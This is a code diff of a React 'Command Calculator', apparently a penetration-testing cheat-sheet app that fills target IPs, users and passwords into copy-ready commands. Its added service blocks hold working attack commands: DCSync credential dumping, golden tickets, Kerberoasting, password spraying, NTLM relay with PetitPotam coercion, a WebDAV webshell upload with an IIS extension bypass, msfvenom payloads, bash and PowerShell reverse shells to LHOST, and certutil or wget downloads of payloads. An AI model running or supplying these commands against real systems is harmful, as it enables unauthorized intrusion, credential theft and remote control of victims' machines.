-            { label: "hydra — pop3", cmd: `hydra -l ${U} -P passwords.txt ${IP} pop3` },
-          ]},
-        ],
-      },
-      rpcbind: {
-        name: "RPCbind", port: "111",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "rpcinfo", cmd: `rpcinfo -p ${IP}` },
-            { label: "nmap — rpcinfo", cmd: `nmap -p111 --script rpcinfo ${IP}` },
-          ]},
-        ],
-      },
-      netbios: {
-        name: "NetBIOS", port: "137 / 138 / 139",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmblookup", cmd: `nmblookup -A ${IP}` },
-            { label: "nbtscan", cmd: `nbtscan ${IP}` },
-            { label: "nmap — nbstat", cmd: `sudo nmap -sU -p137 --script nbstat ${IP}` },
-          ]},
-        ],
-      },
-      telnet: {
-        name: "Telnet", port: "23",
-        groups: [
-          { phase: "Access", cmds: [
-            { label: "Connect", cmd: `telnet ${IP}` },
-            { label: "nmap — info", cmd: `nmap -p23 --script telnet-ntlm-info,telnet-encryption ${IP}` },
-            { label: "hydra — brute", cmd: `hydra -l ${U} -P passwords.txt telnet://${IP}` },
-          ]},
-        ],
-      },
-      tftp: {
-        name: "TFTP", port: "69 (udp)",
-        groups: [
-          { phase: "Access", cmds: [
-            { label: "Connect", cmd: `tftp ${IP}` },
-            { label: "Download a file", cmd: `tftp ${IP} -c get FILENAME` },
-            { label: "Upload a file", cmd: `tftp ${IP} -c put shell.php` },
-            { label: "nmap — enum", cmd: `sudo nmap -sU -p69 --script tftp-enum ${IP}` },
-          ]},
-        ],
-      },
-      setup: {
-        name: "Setup / hosts", port: "—",
-        groups: [
-          { phase: "Variables", cmds: [
-            { label: "/etc/hosts line", cmd: `${IP}  ${HOST}.${D} ${D} ${HOST}` },
-            { label: "Env exports", cmd: `export ip=${IP}; export dcip=${DCIP}; export domain=${D}; export lhost=${LH}` },
-            { label: "Sync clock to DC", cmd: `sudo ntpdate ${DCIP}` },
-          ]},
-        ],
-      },
-    };
-  }, [IP, DCIP, HOST, D, U, SEC, LH, LP, WL, baseDN, authMode, ldapAuth]);
+  // ── services ────────────────────────────────────────────
+  const services = useMemo(() => ({
+    setup: {
+      name: "Setup", groups: [
+        { phase: "Resolve & scope", cmds: [
+          { label: "Add to /etc/hosts", cmd: `echo "${hostsLine}" | sudo tee -a /etc/hosts`, note: "Kills the stale-/.com hostname gotcha before it bites." },
+          { label: "Export shell vars", cmd: `export IP=${IP} DC=${DCIP} DOMAIN=${D} USER='${U}'` },
+        ]},
+        { phase: "First-touch nmap", cmds: [
+          { label: "Full TCP sweep", cmd: `sudo nmap -p- --min-rate 2000 -Pn ${IP} -oN nmap/all.txt` },
+          { label: "Service + scripts on open ports", cmd: `sudo nmap -sCV -p PORTS ${IP} -oN nmap/svc.txt`, note: "Replace PORTS with the open ports from the sweep." },
+          { label: "UDP top ports", cmd: `sudo nmap -sU --top-ports 50 -Pn ${IP} -oN nmap/udp.txt` },
+        ]},
+      ],
+    },
+    ad: {
+      name: "AD Attacks", groups: [
+        { phase: "Auth & exec", cmds: [
+          { label: "psexec", cmd: `impacket-psexec ${impTgt()}` },
+          { label: "wmiexec (quieter)", cmd: `impacket-wmiexec ${impTgt()}` },
+          { label: "smbexec", cmd: `impacket-smbexec ${impTgt()}` },
+          { label: "atexec (single cmd)", cmd: `impacket-atexec ${impTgt()} 'whoami'` },
+        ]},
+        { phase: "Credentials", cmds: [
+          { label: "secretsdump — DCSync (NTLM only)", cmd: `impacket-secretsdump ${impTgt()} -just-dc-ntlm -outputfile dcsync` },
+          { label: "secretsdump — one user", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user Administrator` },
+          { label: "secretsdump — krbtgt (Golden prep)", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user krbtgt`, note: "Grab krbtgt even if you don't use it — enables Golden Ticket persistence." },
+          { label: "secretsdump — local SAM/LSA", cmd: `impacket-secretsdump ${impTgt()}` },
+          { label: "Password spray (nxc)", cmd: `nxc smb ${IP} -u users.txt -p '${SEC}' --continue-on-success`, note: "Check --pass-pol first. One spray per lockout window." },
+        ]},
+        { phase: "Roasting", cmds: [
+          { label: "Kerberoast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting kerb.txt` },
+          { label: "Kerberoast (impacket)", cmd: authMode === "krb"
+            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile kerb.txt`
+            : `impacket-GetUserSPNs ${D}/${U}:'${SEC}' -dc-ip ${DCIP} -request -outputfile kerb.txt` },
+          { label: "AS-REP roast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
+          { label: "AS-REP roast (impacket, userlist)", cmd: `impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile users.txt -no-pass -outputfile asrep.txt` },
+        ]},
+      ],
+    },
+    enum: {
+      name: "Enumeration", groups: [
+        { phase: "SMB / host", cmds: [
+          { label: "nxc smb — host info", cmd: `nxc smb ${IP} ${nxcA()}` },
+          { label: "nxc smb — users", cmd: `nxc smb ${IP} ${nxcA()} --users` },
+          { label: "nxc smb — shares", cmd: `nxc smb ${IP} ${nxcA()} --shares` },
+          { label: "nxc smb — pass policy", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol` },
+          { label: "enum4linux-ng", cmd: `enum4linux-ng -A ${IP} -u '${U}' -p '${SEC}'` },
+          { label: "rpcclient (null)", cmd: `rpcclient -U "" -N ${IP}`, note: "Then: enumdomusers, querydispinfo, enumdomgroups." },
+        ]},
+        { phase: "Kerbrute / userlists", cmds: [
+          { label: "kerbrute — userenum", cmd: `kerbrute userenum -d ${D} --dc ${DCIP} users.txt` },
+          { label: "BloodHound (python)", cmd: `bloodhound-python -u '${U}' -p '${SEC}' -d ${D} -ns ${DCIP} -c All --zip` },
+        ]},
+      ],
+    },
+    ldap: {
+      name: "LDAP", groups: [
+        { phase: "Connect & recon", cmds: [
+          { label: "rootDSE (anon)", cmd: `ldapsearch -x -H ldap://${IP} -s base -b "" "(objectClass=*)" "*" +` },
+          { label: "All users (authed)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName description memberOf` },
+          { label: "Computers", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" dNSHostName operatingSystem` },
+          { label: "windapsearch — DA group", cmd: `windapsearch -d ${D} --dc-ip ${DCIP} -u '${U}@${D}' -p '${SEC}' --da` },
+        ]},
+        { phase: "UAC bitmask filters", cmds: [
+          { label: "Kerberoastable (SPN set)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` },
+          { label: "AS-REP roastable (no preauth)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName` },
+          { label: "Password in description", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(description=*pass*)" sAMAccountName description` },
+        ]},
+      ],
+    },
+    smb: {
+      name: "SMB", groups: [
+        { phase: "Shares", cmds: [
+          { label: "smbmap", cmd: `smbmap -H ${IP} -u '${U}' -p '${SEC}' -d ${D}` },
+          { label: "smbclient — list", cmd: `smbclient -L //${IP}/ -U '${D}/${U}%${SEC}'` },
+          { label: "smbclient — connect", cmd: `smbclient //${IP}/SHARE -U '${D}/${U}%${SEC}'` },
+          { label: "nxc — spider shares", cmd: `nxc smb ${IP} ${nxcA()} -M spider_plus` },
+        ]},
+      ],
+    },
+    kerberos: {
+      name: "Kerberos", groups: [
+        { phase: "Tickets", cmds: [
+          { label: "Request TGT", cmd: `impacket-getTGT ${D}/${U}:'${SEC}' -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
+          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=${U}.ccache\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}` },
+          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
+        ]},
+      ],
+    },
+    mssql: {
+      name: "MSSQL", groups: [
+        { phase: "Connect & exec", cmds: [
+          { label: "mssqlclient", cmd: authMode === "krb"
+            ? `impacket-mssqlclient -k ${D}/${U}@${HOST} -dc-ip ${DCIP}`
+            : `impacket-mssqlclient ${D}/${U}:'${SEC}'@${IP} -windows-auth` },
+          { label: "enable xp_cmdshell", cmd: `EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';` },
+        ]},
+      ],
+    },
+    winrm: {
+      name: "WinRM", groups: [
+        { phase: "Shell", cmds: [
+          { label: "evil-winrm", cmd: `evil-winrm -i ${TH} -u ${U} ${winrmAuth}`, note: authMode === "krb" ? "Needs KRB5CCNAME set + host in /etc/hosts." : null },
+          { label: "nxc winrm — check + exec", cmd: `nxc winrm ${IP} ${nxcA()} -x 'whoami'` },
+        ]},
+      ],
+    },
+    rdp: {
+      name: "RDP", groups: [
+        { phase: "Connect", cmds: [
+          { label: "xfreerdp", cmd: authMode === "hash"
+            ? `xfreerdp /u:${U} /pth:${SEC} /v:${IP} +clipboard /cert:ignore`
+            : `xfreerdp /u:${U} /p:'${SEC}' /v:${TH} +clipboard /cert:ignore` },
+          { label: "nxc rdp — check", cmd: `nxc rdp ${IP} ${nxcA()}` },
+        ]},
+      ],
+    },
+    relay: {
+      name: "Relay / Poison", groups: [
+        { phase: "Capture & relay", cmds: [
+          { label: "responder", cmd: `sudo responder -I tun0 -wd` },
+          { label: "ntlmrelayx (to SMB)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support` },
+          { label: "coerce (PetitPotam)", cmd: `python3 PetitPotam.py -u '${U}' -p '${SEC}' -d ${D} ${LHOST} ${IP}` },
+        ]},
+      ],
+    },
+    webdav: {
+      name: "WebDAV", groups: [
+        { phase: "Detect", cmds: [
+          { label: "nmap — methods + webdav-scan", cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods ${IP}` },
+          { label: "OPTIONS — look for PUT in Allow", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i -E 'allow|dav'` },
+          { label: "Probe common dirs", cmd: `for d in / /webdav/ /dav/ /uploads/ /files/; do echo "== $d =="; curl -s -i -X OPTIONS http://${IP}$d | grep -i allow; done`, note: "PUT in the Allow line = you can upload there." },
+        ]},
+        { phase: "Confirm what lands (davtest)", cmds: [
+          { label: "davtest", cmd: `davtest -url http://${IP}` },
+          { label: "davtest — authed", cmd: `davtest -url http://${IP} -auth '${U}:${SEC}'`, note: `Domain box? try the prefixed form '${NB}\\${U}:${SEC}'.` },
+        ]},
+        { phase: "Upload → RCE (IIS bypass)", cmds: [
+          { label: "Make the shell (IIS / PHP)", cmd: `cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx\ncp /usr/share/webshells/php/php-reverse-shell.php shell.php`, note: "IIS runs .aspx; Apache/PHP runs .php. A .php shell on IIS just downloads as text." },
+          { label: "PUT .txt then MOVE to .aspx", cmd: `curl -s -u '${U}:${SEC}' -X PUT http://${IP}/shell.txt --data-binary @shell.aspx\ncurl -s -u '${U}:${SEC}' -X MOVE http://${IP}/shell.txt -H "Destination: http://${IP}/shell.aspx"`, note: "IIS blocks PUT of .aspx directly but allows .txt → MOVE renames server-side. Add --ntlm if it negotiates NTLM." },
+          { label: "Direct PUT (PHP stack)", cmd: `curl -s -u '${U}:${SEC}' -X PUT http://${IP}/shell.php --data-binary @shell.php` },
+          { label: "Trigger it", cmd: `curl "http://${IP}/shell.aspx"   # browse to execute` },
+        ]},
+        { phase: "Interactive (cadaver)", cmds: [
+          { label: "cadaver — open session", cmd: `cadaver http://${IP}/`, note: "Prompts for creds if WebDAV needs auth. Use the path OPTIONS confirmed." },
+          { label: "Inside the dav:/> prompt", cmd: `put shell.aspx              # upload your shell\nmove shell.txt shell.aspx   # IIS bypass: rename server-side\nls                          # list remote dir\nget web.config              # pull files (configs, creds)\nmkcol loot                  # make a dir\ndelete shell.aspx           # clean up when done`, note: "These are cadaver commands, not shell — type them at the dav:/> prompt." },
+          { label: "Non-interactive auth (~/.netrc)", cmd: `echo "machine ${IP} login ${U} password ${SEC}" >> ~/.netrc && chmod 600 ~/.netrc\ncadaver http://${IP}/`, note: "cadaver auto-reads ~/.netrc so it won't prompt." },
+        ]},
+      ],
+    },
+    payloads: {
+      name: "Payloads / Shells", groups: [
+        { phase: "msfvenom", cmds: [
+          { label: "Windows x64 reverse exe", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o shell.exe` },
+          { label: "Linux x64 reverse elf", cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf` },
+        ]},
+        { phase: "One-liners & listeners", cmds: [
+          { label: "Bash reverse shell", cmd: `bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'` },
+          { label: "PowerShell reverse (IEX cradle)", cmd: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"` },
+          { label: "Listener (rlwrap nc)", cmd: `rlwrap -cAr nc -lvnp ${LPORT}` },
+        ]},
+      ],
+    },
+    transfer: {
+      name: "File Transfer", groups: [
+        { phase: "Serve", cmds: [
+          { label: "HTTP server (Kali)", cmd: `python3 -m http.server 80` },
+          { label: "SMB server (impacket)", cmd: `impacket-smbserver share $(pwd) -smb2support -user kali -password kali` },
+        ]},
+        { phase: "Pull (on target)", cmds: [
+          { label: "Windows — certutil", cmd: `certutil -urlcache -f http://${LHOST}/shell.exe shell.exe` },
+          { label: "Windows — PowerShell iwr", cmd: `iwr -Uri http://${LHOST}/shell.exe -OutFile shell.exe` },
+          { label: "Linux — wget", cmd: `wget http://${LHOST}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh` },
+        ]},
+      ],
+    },
+    cracking: {
+      name: "Hash Cracking", groups: [
+        { phase: "hashcat modes", cmds: [
+          { label: "NTLM (-m 1000)", cmd: `hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt` },
+          { label: "Kerberoast TGS (-m 13100)", cmd: `hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt` },
+          { label: "AS-REP (-m 18200)", cmd: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt` },
+          { label: "NetNTLMv2 (-m 5600)", cmd: `hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt` },
+        ]},
+      ],
+    },
+  }), [authMode, f, baseDN, NB, hostsLine, IP, DCIP, HOST, D, U, SEC, LHOST, LPORT, TH, ldapAuth, winrmAuth]);
 
-  const order = ["setup","ad","ldap","smb","kerberos","mssql","mysql","postgres","redis","winrm","ssh","rdp","ftp","nfs","http","webdav","tomcat","pop3imap","rpcbind","netbios","telnet","tftp","snmp","smtp","dns","payloads","transfer"];
+  // ── global filter across every service ──────────────────
+  const q = filter.trim().toLowerCase();
+  const filtered = useMemo(() => {
+    if (!q) return null;
+    const out = [];
+    for (const [id, svc] of Object.entries(services)) {
+      const cmds = [];
+      for (const g of svc.groups)
+        for (const c of g.cmds)
+          if (c.label.toLowerCase().includes(q) || c.cmd.toLowerCase().includes(q))
+            cmds.push({ ...c, phase: g.phase });
+      if (cmds.length) out.push({ id, name: svc.name, cmds });
+    }
+    return out;
+  }, [q, services]);
 
-  const doCopy = (cmd, key) => {
-    navigator.clipboard?.writeText(cmd);
-    setCopied(key);
-    setTimeout(() => setCopied((c) => (c === key ? null : c)), 1100);
-  };
-  const toggle = (k) => setCollapsed((c) => ({ ...c, [k]: !c[k] }));
-
-  const renderCmd = (cmd) =>
-    cmd.split(/(<[A-Z]+>)/g).map((p, i) =>
-      /^<[A-Z]+>$/.test(p) ? <span key={i} className="ph">{p}</span> : <span key={i}>{p}</span>
-    );
-
-  const fields = [
-    ["Target IP", ip, setIp, "10.10.10.10"],
-    ["DC IP", dcip, setDcip, "(defaults to target)"],
-    ["Hostname", host, setHost, "DC01"],
-    ["Domain", domain, setDomain, "corp.local"],
-    ["User", user, setUser, "j.doe"],
-    [authMode === "hash" ? "NTLM hash" : "Password", secret, setSecret, authMode === "hash" ? "aad3b...:nthash" : "Summer2026!"],
-    ["LHOST", lhost, setLhost, "10.10.14.5"],
-    ["LPORT", lport, setLport, "443"],
-  ];
-
-  const fil = filter.trim().toLowerCase();
-  const view = fil
-    ? order.map((id) => ({ id, svc: services[id], groups: services[id].groups
-        .map((g) => ({ ...g, cmds: g.cmds.filter((c) => (c.label + c.cmd).toLowerCase().includes(fil)) }))
-        .filter((g) => g.cmds.length) })).filter((s) => s.groups.length)
-    : [{ id: service, svc: services[service], groups: services[service].groups }];
+  const svc = services[active];
 
   return (
-    <div className="cc-root">
-      <style>{CSS}</style>
+    <div className="cc">
+      <style>{css}</style>
 
-      <header className="cc-head">
-        <div className="cc-title"><span className="cc-mark">$_</span> Command Calculator</div>
-        <div className="cc-sub">Set variables once · pick a service · click any command to copy</div>
+      <header className="cc-hdr">
+        <a href="/" className="cc-back">← The Path</a>
+        <h1 className="cc-title">Command Calculator</h1>
+        <p className="cc-sub">Fill the bar once · every command rewrites live · click to copy</p>
       </header>
 
-      <div className="cc-panel">
-        <div className="cc-grid">
-          {fields.map(([label, val, set, ph]) => (
-            <label key={label} className="cc-field">
-              <span>{label}</span>
-              <input value={val} placeholder={ph} onChange={(e) => set(e.target.value)} spellCheck={false} />
-            </label>
+      {/* VARIABLE BAR */}
+      <div className="varbar">
+        <div className="var-grid">
+          {FIELDS.map(({ k, label, ph, secret }) => (
+            <div key={k} className="var">
+              <label>{label}</label>
+              <input
+                value={f[k]}
+                onChange={set(k)}
+                placeholder={ph}
+                type={secret ? "text" : "text"}
+                spellCheck={false}
+                autoComplete="off"
+              />
+            </div>
           ))}
-          <label className="cc-field cc-wide">
-            <span>Wordlist</span>
-            <input value={wordlist} onChange={(e) => setWordlist(e.target.value)} spellCheck={false} />
-          </label>
         </div>
-
-        <div className="cc-row">
-          <div className="cc-auth">
-            <span className="cc-authlbl">Auth</span>
-            {[["pw","Password"],["hash","NTLM hash"],["krb","Kerberos"]].map(([k,l]) => (
-              <button key={k} className={authMode === k ? "on" : ""} onClick={() => setAuthMode(k)}>{l}</button>
+        <div className="auth-row">
+          <span className="auth-lbl">Auth mode</span>
+          <div className="auth-toggle">
+            {AUTH.map((a) => (
+              <button
+                key={a.id}
+                className={`auth-btn${authMode === a.id ? " on" : ""}`}
+                onClick={() => setAuthMode(a.id)}
+              >
+                {a.label}
+              </button>
             ))}
           </div>
-
-          <div className="cc-svc">
-            <span className="cc-authlbl">Service</span>
-            <select value={service} onChange={(e) => { setService(e.target.value); setFilter(""); }}>
-              {order.map((id) => (
-                <option key={id} value={id}>{services[id].name}{services[id].port !== "—" && services[id].port !== "core" ? `  ·  ${services[id].port}` : ""}</option>
-              ))}
-            </select>
+          <div className="derived">
+            <Chip label="base DN" value={baseDN} />
+            <Chip label="NETBIOS" value={NB} />
+            <Chip label="/etc/hosts" value={hostsLine.replace("\t", "  ")} />
           </div>
-
-          <input className="cc-filter" value={filter} placeholder="search ALL services… (psexec, kerberoast, snmpwalk)" onChange={(e) => setFilter(e.target.value)} spellCheck={false} />
         </div>
-
         {authMode === "krb" && (
-          <div className="cc-note">
-            Kerberos mode: commands use the <b>hostname</b>, not the IP. Set <code>/etc/hosts</code> (Setup service),
-            request a ticket with <code>getTGT</code>, then <code>export KRB5CCNAME={U}.ccache</code> before running.
+          <div className="krb-banner">
+            Kerberos mode — commands now target <b>{HOST}</b>, not the IP. Make sure the host is in
+            <code> /etc/hosts</code> and you've run <code>export KRB5CCNAME=ticket.ccache</code>.
           </div>
         )}
       </div>
 
-      <div className="cc-sections">
-        {view.map(({ id, svc, groups }) => (
-          <div key={id} className="cc-svcblock">
-            {fil && <div className="cc-svcname">{svc.name}<span>{svc.port}</span></div>}
-            {groups.map((g) => {
-              const gk = id + "|" + g.phase;
-              const isOpen = !collapsed[gk];
-              return (
-                <section key={gk} className="cc-section">
-                  <button className="cc-phase" onClick={() => toggle(gk)}>
-                    <span className={"cc-caret" + (isOpen ? " open" : "")}>▸</span>
-                    {g.phase}
-                    <span className="cc-count">{g.cmds.length}</span>
-                  </button>
-                  {isOpen && (
-                    <div className="cc-cmds">
-                      {g.cmds.map((c, i) => {
-                        const key = gk + i;
-                        return (
-                          <div key={key} className="cc-cmd" onClick={() => doCopy(c.cmd, key)} title="Click to copy">
-                            <div className="cc-cmdlabel">{c.label}</div>
-                            <code className="cc-cmdtext">{renderCmd(c.cmd)}</code>
-                            <span className={"cc-copy" + (copied === key ? " done" : "")}>{copied === key ? "copied" : "copy"}</span>
-                          </div>
-                        );
-                      })}
-                    </div>
-                  )}
-                </section>
-              );
-            })}
-          </div>
-        ))}
-        {!view.length && <div className="cc-empty">No commands match “{filter}”.</div>}
+      {/* FILTER */}
+      <div className="filter-wrap">
+        <input
+          className="filter"
+          value={filter}
+          onChange={(e) => setFilter(e.target.value)}
+          placeholder="Filter every binary — psexec, kerberoast, snmpwalk…"
+          spellCheck={false}
+        />
+        {filter && <button className="filter-clear" onClick={() => setFilter("")}>clear</button>}
       </div>
 
-      <footer className="cc-foot">Amber tokens like <span className="ph">&lt;IP&gt;</span> are values you haven't set yet.</footer>
+      {/* CONTENT */}
+      {filtered ? (
+        <div className="results">
+          {filtered.length === 0 ? (
+            <div className="empty">No command matches “{filter}”. Try a binary name or flag.</div>
+          ) : (
+            filtered.map((s) => (
+              <section key={s.id} className="svc-block">
+                <h2 className="svc-name">{s.name}</h2>
+                <div className="cmd-list">
+                  {s.cmds.map((c, i) => <CmdCard key={i} {...c} />)}
+                </div>
+              </section>
+            ))
+          )}
+        </div>
+      ) : (
+        <>
+          <nav className="tabs">
+            {Object.entries(services).map(([id, s]) => (
+              <button
+                key={id}
+                className={`tab${active === id ? " on" : ""}`}
+                onClick={() => setActive(id)}
+              >
+                {s.name}
+              </button>
+            ))}
+          </nav>
+          <div className="results">
+            {svc.groups.map((g, gi) => (
+              <section key={gi} className="svc-block">
+                <h2 className="svc-name">{g.phase}</h2>
+                <div className="cmd-list">
+                  {g.cmds.map((c, i) => <CmdCard key={i} {...c} />)}
+                </div>
+              </section>
+            ))}
+          </div>
+        </>
+      )}
     </div>
   );
 }
 
-const CSS = `
-.cc-root{--bg:#0f1218;--panel:#161b24;--panel2:#1b212c;--bd:#28303d;--tx:#d7dde6;--dim:#8a94a6;--amber:#f0a830;--cyan:#56b6c2;--ok:#7ec699;
-  background:var(--bg);color:var(--tx);min-height:100vh;padding:28px 20px 60px;
-  font-family:ui-monospace,"JetBrains Mono","SF Mono",Menlo,Consolas,monospace;}
-.cc-head{max-width:1100px;margin:0 auto 18px;}
-.cc-title{font-size:24px;font-weight:700;letter-spacing:.3px;display:flex;align-items:center;gap:10px;}
-.cc-mark{color:var(--amber);background:#20262f;padding:2px 8px;border-radius:6px;font-weight:700;}
-.cc-sub{color:var(--dim);font-size:13px;margin-top:6px;}
-.cc-panel{max-width:1100px;margin:0 auto 22px;background:var(--panel);border:1px solid var(--bd);border-radius:12px;padding:18px;position:sticky;top:12px;z-index:5;box-shadow:0 8px 30px rgba(0,0,0,.35);}
-.cc-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;}
-.cc-field{display:flex;flex-direction:column;gap:5px;font-size:12px;}
-.cc-field.cc-wide{grid-column:span 4;}
-.cc-field span{color:var(--dim);text-transform:uppercase;letter-spacing:.6px;font-size:10.5px;}
-.cc-field input{background:var(--panel2);border:1px solid var(--bd);border-radius:7px;color:var(--tx);padding:9px 10px;font:inherit;font-size:13px;outline:none;transition:border-color .12s;}
-.cc-field input:focus{border-color:var(--amber);}
-.cc-field input::placeholder{color:#566275;}
-.cc-row{display:flex;gap:14px;align-items:center;margin-top:14px;flex-wrap:wrap;}
-.cc-auth,.cc-svc{display:flex;align-items:center;gap:6px;}
-.cc-authlbl{color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:.6px;margin-right:2px;}
-.cc-auth button{background:var(--panel2);border:1px solid var(--bd);color:var(--dim);padding:8px 13px;border-radius:7px;font:inherit;font-size:12.5px;cursor:pointer;transition:all .12s;}
-.cc-auth button:hover{color:var(--tx);border-color:#3a4452;}
-.cc-auth button.on{background:var(--amber);color:#1a1205;border-color:var(--amber);font-weight:700;}
-.cc-svc select{background:var(--panel2);border:1px solid var(--bd);color:var(--tx);padding:8px 12px;border-radius:7px;font:inherit;font-size:13px;outline:none;cursor:pointer;}
-.cc-svc select:focus{border-color:var(--amber);}
-.cc-filter{flex:1;min-width:220px;background:var(--panel2);border:1px solid var(--bd);border-radius:7px;color:var(--tx);padding:9px 12px;font:inherit;font-size:13px;outline:none;}
-.cc-filter:focus{border-color:var(--cyan);}
-.cc-filter::placeholder{color:#566275;}
-.cc-note{margin-top:14px;background:#1d2330;border:1px solid #3a3320;border-radius:8px;padding:10px 12px;font-size:12.5px;color:#e9d9b6;line-height:1.6;}
-.cc-note code{background:#0d1117;padding:1px 6px;border-radius:4px;color:var(--amber);}
-.cc-sections{max-width:1100px;margin:0 auto;display:flex;flex-direction:column;gap:10px;}
-.cc-svcblock{display:flex;flex-direction:column;gap:10px;}
-.cc-svcname{font-size:13px;color:var(--cyan);text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:10px;display:flex;gap:10px;align-items:baseline;}
-.cc-svcname span{color:var(--dim);font-size:11px;letter-spacing:.5px;}
-.cc-section{background:var(--panel);border:1px solid var(--bd);border-radius:10px;overflow:hidden;}
-.cc-phase{width:100%;text-align:left;background:transparent;border:0;color:var(--amber);font:inherit;font-size:12px;text-transform:uppercase;letter-spacing:1px;font-weight:700;padding:12px 14px;cursor:pointer;display:flex;align-items:center;gap:9px;}
-.cc-phase:hover{background:var(--panel2);}
-.cc-caret{display:inline-block;transition:transform .15s;color:var(--dim);}
-.cc-caret.open{transform:rotate(90deg);}
-.cc-count{margin-left:auto;color:var(--dim);font-weight:600;font-size:11px;background:var(--panel2);padding:1px 8px;border-radius:10px;}
-.cc-cmds{display:flex;flex-direction:column;gap:8px;padding:4px 12px 14px;}
-.cc-cmd{position:relative;background:var(--panel2);border:1px solid var(--bd);border-left:3px solid #2f3947;border-radius:8px;padding:10px 78px 10px 13px;cursor:pointer;transition:border-color .12s,background .12s;}
-.cc-cmd:hover{border-left-color:var(--amber);}
-.cc-cmdlabel{color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px;}
-.cc-cmdtext{display:block;white-space:pre-wrap;word-break:break-all;font-size:13px;line-height:1.55;color:#e6ebf2;}
-.ph{color:var(--amber);background:rgba(240,168,48,.1);padding:0 3px;border-radius:3px;font-weight:600;}
-.cc-copy{position:absolute;top:10px;right:10px;font-size:11px;color:var(--dim);background:var(--panel);border:1px solid var(--bd);padding:3px 9px;border-radius:5px;transition:all .12s;}
-.cc-cmd:hover .cc-copy{color:var(--tx);border-color:#3a4452;}
-.cc-copy.done{color:#1a1205;background:var(--ok);border-color:var(--ok);font-weight:700;}
-.cc-empty{max-width:1100px;margin:30px auto;color:var(--dim);text-align:center;}
-.cc-foot{max-width:1100px;margin:30px auto 0;color:var(--dim);font-size:12px;text-align:center;}
-.cc-foot .ph{font-size:12px;}
-@media(max-width:760px){.cc-grid{grid-template-columns:repeat(2,1fr);}.cc-field.cc-wide{grid-column:span 2;}.cc-panel{position:static;}}
-@media(prefers-reduced-motion:reduce){*{transition:none!important;}}
+const css = `
+  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=JetBrains+Mono:wght@400;500;700&display=swap');
+  .cc *{box-sizing:border-box;margin:0;padding:0}
+  .cc{
+    --bg:#0b0f14; --panel:#11161d; --panel2:#0d1219; --line:#1d2630;
+    --ink:#c4d0dc; --dim:#5f7184; --amber:#f5a623; --amber-soft:#f5a62322;
+    --accent:#7fb3ff; --ok:#6ee7a8;
+    min-height:100vh; background:var(--bg); color:var(--ink);
+    font-family:'JetBrains Mono',ui-monospace,monospace; padding:1.5rem 1rem 4rem;
+  }
+  .cc-hdr{max-width:1080px;margin:0 auto 1.1rem}
+  .cc-back{color:var(--dim);font-size:.72rem;text-decoration:none}
+  .cc-back:hover{color:var(--amber)}
+  .cc-title{font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1.7rem;letter-spacing:-.01em;margin-top:.35rem;color:#eaf1f8}
+  .cc-sub{font-size:.7rem;color:var(--dim);margin-top:.15rem;letter-spacing:.02em}
+
+  .varbar{position:sticky;top:0;z-index:20;max-width:1080px;margin:0 auto 1rem;
+    background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:.9rem;
+    box-shadow:0 8px 30px -12px #000a}
+  .var-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.55rem}
+  .var{display:flex;flex-direction:column;gap:.22rem}
+  .var label{font-size:.54rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
